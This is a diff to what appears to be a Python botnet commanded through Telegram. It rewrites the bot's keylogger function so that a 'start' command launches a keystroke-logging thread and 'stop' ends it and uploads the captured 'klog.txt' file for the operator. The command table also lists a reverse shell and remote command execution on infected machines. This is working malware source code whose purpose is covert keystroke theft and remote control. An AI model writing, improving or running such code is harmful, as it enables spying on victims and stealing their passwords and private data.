@@ -15,6 +15,8 @@ from . import util
 from . import settings
 
 MAC_ADDRES = str(get_system_mac_addres())
+keylogger_thread = None
+keylogger_util = None
 
 scripts_name = {
     MAC_ADDRES: "`<system MAC_ADDRES> <command>`: run command on one target",
@@ -37,7 +39,7 @@ scripts_name = {
 
     "/start": "`/start`: run `help` command!",
 
-    "keylogger start/stop": "`keylogger start/stop`: Starts keylogger. use keylogger stop to stop keylogger" ,
+    "keylogger": "`keylogger start/stop`: Starts keylogger. use keylogger stop to stop keylogger" ,
 
     "reverse_shell": "`<system MAC_ADDRES> reverse_shell`: start reverse shell on target system"
 }
@@ -146,8 +148,8 @@ def execute_scripts(command: str, pybotnet_up_time: int, is_shell: bool, ADMIN_C
             elif command_name in ['reverse_shell']:
                 return reverse_shell(is_shell, ADMIN_CHAT_ID, TELEGRAM_TOKEN, previous_update_id, logger)
             
-            elif command_name == "keylogger":
-                return keylogger(command,logger)
+            elif command_name == "keylogger" and split_command(command)[1] in ['start','stop']:
+                return keylogger(logger,command)
         logger.error('execute_scripts invalid command; Wrong format')
         return f"execute_scripts invalid command; Wrong format \n\n scripts name:\n {','.join(scripts_name)}"
 
@@ -413,40 +415,36 @@ def screenshot(logger):
 
 
 def keylogger(logger,command):
+    global keylogger_util,keylogger_thread
     """checks if command[1] is off or on. if on , a thread to start keylogging will start 
     if off , keylogger thread will stop. this function will handle multiple keyloggers running."""
-    thread_name = "keylog" # for threading , this way we can prevent multiple keyloggers running at the same time
-    keylogger = util.KeyLogger()
+    keylogger_thread_name = "keylog" # for threading , this way we can prevent multiple keyloggers running at the same time
     # if user requested keylogger to be turned on
-    if split_command(command)[1] == 'on':
-        for th in threading.enumerate():
-            if th.name == thread_name:
-                logger.error("user requested keylogger to be turned on , but keylogger is already on.")
-                return "Key logger is already on. "
-            else:
-                logger.info('turning keylogger on...')
-                keylogger_thread = threading.Thread(target=logger.start(),name="keylog")
-                keylogger_thread.start()
-                logger.info('keylogger is on')
+    if split_command(command)[1] == 'start':
+        keylogger_util = util.KeyLogger()
+        if keylogger_thread_name in (i.name for i in threading.enumerate()):
+            logger.error('keylogger is already turned on')
+            return 'keylogger is already turned on'
+        logger.info('turning keylogger on...')
+        keylogger_thread = threading.Thread(target=keylogger_util.start,name=keylogger_thread_name)
+        keylogger_thread.start()
+        keylogger_thread.join()
+        logger.info('keylogger turned on.')
+        return 'Key logger turned on.'
     
     # if user requested keylogger to be turned off
-    if split_command(command)[1] == 'off':
-        for th in threading.enumerate():
-            if th.name == thread_name: # if keylogger is on
-                keylogger.stop()
-                keylogger_thread.join()
-                data = upload_manager("klog.txt",logger)
-                if data[0] == False:
-                    return 'upload failed'
-                else:
-                    return data[1]
-
-
+    if split_command(command)[1] == 'stop':
+        try:
+            keylogger_thread.join()
+            keylogger_util.stop()
+            data = upload_manager("klog.txt",logger)
+            if data[0] == False:
+                return 'upload failed'
             else:
-                logger.error('user requested to turn off the keylogger , but keylogger was already off')
-                return 'Key logger is already off'
-
-    
+                return 'keylogger off. logger txt file => {0}'.format(data[1])
+        except:
+            return 'keylogger is already off.'
+        
 
 
 
